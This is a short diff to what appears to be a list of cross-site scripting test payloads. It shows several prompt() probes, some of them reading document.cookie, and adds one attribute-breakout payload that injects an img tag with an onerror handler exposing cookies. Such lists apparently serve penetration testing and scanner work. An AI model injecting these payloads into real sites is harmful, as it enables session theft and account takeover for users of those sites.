@@ -139,3 +139,4 @@ prompt(123)
 prompt("test")
 prompt(document.cookie)
 prompt(document.domain)
+#"><img src=/ onerror=alert(document.cookie)>
